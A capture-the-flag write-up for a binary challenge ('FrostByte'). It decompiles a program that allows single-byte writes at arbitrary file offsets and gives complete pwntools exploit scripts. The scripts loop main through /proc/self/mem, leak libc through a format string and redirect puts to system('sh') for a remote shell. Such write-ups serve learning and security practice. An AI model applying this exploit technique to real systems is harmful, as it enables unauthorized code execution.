# Day 16 FrostByte

Decompile the attachment:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+Fh] [rbp-11h] BYREF
  int v5; // [rsp+10h] [rbp-10h] BYREF
  int fd; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  printf("Enter filename: ");
  fgets(filename_0, 256, stdin);
  filename_0[strcspn(filename_0, "\n")] = 0;
  printf("Enter offset: ");
  __isoc99_scanf("%d", &v5);
  getchar();
  printf("Enter data: ");
  read(0, &buf, 1u);
  fd = open(filename_0, 1);
  lseek(fd, v5, 0);
  write(fd, &buf, 1u);
  puts("Write complete.");
  return 0;
}
```

We can write to arbitrary file at arbitrary offset, but only one byte. The executable is dynamically linked, but its own functions are static. So, we can override ELF content by writing to `/proc/self/mem`.

But the one byte limit is too hard. What if we can let main be called multiple times? I wrote a skip to bruteforce the location and the byte written to make it work, so that we can observe extra reads from stdin:

```python
from pwn import *
context(log_level = "DEBUG")

for offset in range(0x4012b5, 0x4013f8):
    for byte in range(256):
        # filtering of non-working offset omitted here
        p = process(["strace", "-o", "strace.log", "./chall"])
        p.recvuntil(b"Enter filename")
        p.sendline(b"/proc/self/mem")
        p.recvuntil(b"Enter offset")
        p.sendline(str(offset).encode())
        p.recvuntil(b"Enter data")
        p.send(bytes([byte]))
        p.recvall(timeout=5)
        log = open("strace.log", "r").read()
        if log.count("read(") > 4:
            # possible
            print(log, byte)
            break
```

Eventually, we found that, if we override the `ret` instruction at `0x4013f7` to `leave` (0xc9), then it will fallthrough to `_term_proc` and eventually go back to main again. Therefore, we can write multiple bytes.

Now, we need to leak libc address. Since we can write to `.rodata` section, we simply override the argument of `printf` to `%11$p`, and it will leak some libc address for us.

Next, to get shell, we want some function call to become `system("sh")`. The last `puts("Write complete.")` is our selected victim:

1. Override `Write complete.` to `sh\x00`
2. Because we can only override one byte at one time, write the address of `system` to `0x404060` instead of overriding `puts` address directly
3. Override the `jmp cs:off_404000` instruction in `.plt.sec` section for `puts` to `jmp cs:off_404060`, since there is only one byte in difference

Attack script:

```python
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level = "DEBUG")

#p = process(["strace", "-o", "strace.log", "./chall"])
if args.REMOTE:
    p = remote("ctf.csd.lol", 8888)
else:
    p = process(["./chall"])

def write(offset, byte):
    p.recvuntil(b"me: ")
    p.sendline(b"/proc/self/mem")
    p.recvuntil(b"Enter offset")
    p.sendline(str(offset).encode())
    p.recvuntil(b"Enter data")
    p.send(bytes([byte]))

# change
# 0x4013f7: ret
# to
# 0x4013f7: leave
# so it returns to __libc_start_main, and we can write more bytes
write(0x4013f7, 0xc9)

# override "Enter filename:" to leak libc
s = b"%11$p"
for i in range(len(s)):
    write(0x402004+i, s[i])

p.recvuntil(b"Write complete.\n")
addr = int(p.recvuntil(b" ").decode(), 0)
libc_base = addr - 0x7f46e024d1ca + 0x7f46e0223000 # next instruction of call *%rax in libc
print("libc base", hex(libc_base))

# override "Write complete." to "sh"
s = b"sh\x00"
for i in range(len(s)):
    write(0x402036+i, s[i])

# override puts to system
# 1. override data at 0x404060 near .got.plt to system
s = p64(libc_base + libc.symbols["system"])
for i in range(len(s)):
    write(0x404060+i, s[i])

# 2. let puts stub to jump to setbuf(system)
# 0x4010f4: jmp cs:off_404000
# to:
# 0x4010f4: jmp cs:off_404060
write(0x4010f6, 0x66)

# get shell
p.interactive()
```

However, the remote does not send the first `Enter filename:`. The solution is to skip the first recvuntil and do the rest normally:

```python
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level = "DEBUG")

#p = process(["strace", "-o", "strace.log", "./chall"])
if args.REMOTE:
    p = remote("ctf.csd.lol", 8888)
else:
    p = process(["./chall"])

is_first = True

def write(offset, byte):
    global is_first
    if not is_first:
        p.recvuntil(b"me: ")
    is_first = False
    p.sendline(b"/proc/self/mem")
    p.recvuntil(b"Enter offset")
    p.sendline(str(offset).encode())
    p.recvuntil(b"Enter data")
    p.send(bytes([byte]))

# change
# 0x4013f7: ret
# to
# 0x4013f7: leave
# so it returns to __libc_start_main, and we can write more bytes
write(0x4013f7, 0xc9)

# override "Enter filename:" to leak libc
s = b"%11$p"
for i in range(len(s)):
    write(0x402004+i, s[i])

p.recvuntil(b"Write complete.\n")
addr = int(p.recvuntil(b" ").decode(), 0)
libc_base = addr - 0x7f46e024d1ca + 0x7f46e0223000 # next instruction of call *%rax in libc
print("libc base", hex(libc_base))

# override "Write complete." to "sh"
s = b"sh\x00"
for i in range(len(s)):
    write(0x402036+i, s[i])

# override puts to system
# 1. override data at 0x404060 near .got.plt to system
s = p64(libc_base + libc.symbols["system"])
for i in range(len(s)):
    write(0x404060+i, s[i])

# 2. let puts stub to jump to setbuf(system)
# 0x4010f4: jmp cs:off_404000
# to:
# 0x4010f4: jmp cs:off_404060
write(0x4010f6, 0x66)

# get shell
p.interactive()
```
